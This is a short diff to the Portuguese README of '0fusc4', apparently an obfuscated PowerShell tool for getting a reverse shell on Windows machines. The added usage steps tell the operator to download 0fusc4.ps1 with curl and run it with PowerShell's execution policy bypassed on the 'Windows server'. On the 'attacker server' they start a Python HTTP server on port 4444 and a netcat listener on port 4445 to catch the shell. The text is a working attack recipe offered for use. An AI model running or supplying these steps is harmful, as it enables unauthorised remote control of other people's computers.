@@ -11,9 +11,13 @@ Dessa forma, o 0fusc4 possibilita a execução de um shell reverso por meio de u
 
 Use:
 
+Servidor Windows
 - curl -O "http://example.com/0fusc4.ps1"
-
 - powershell.exe -ExecutionPolicy Bypass -File "0fusc4.ps1"
+
+Servidor Ofensor
+- python3 -m http.server 4444
+- nc -lnvp 4445
 
 ![image](https://github.com/carlosalbertotuma/0fusc4/assets/13341724/eff83c3f-3887-45a1-8536-d567aa26d52d)
 
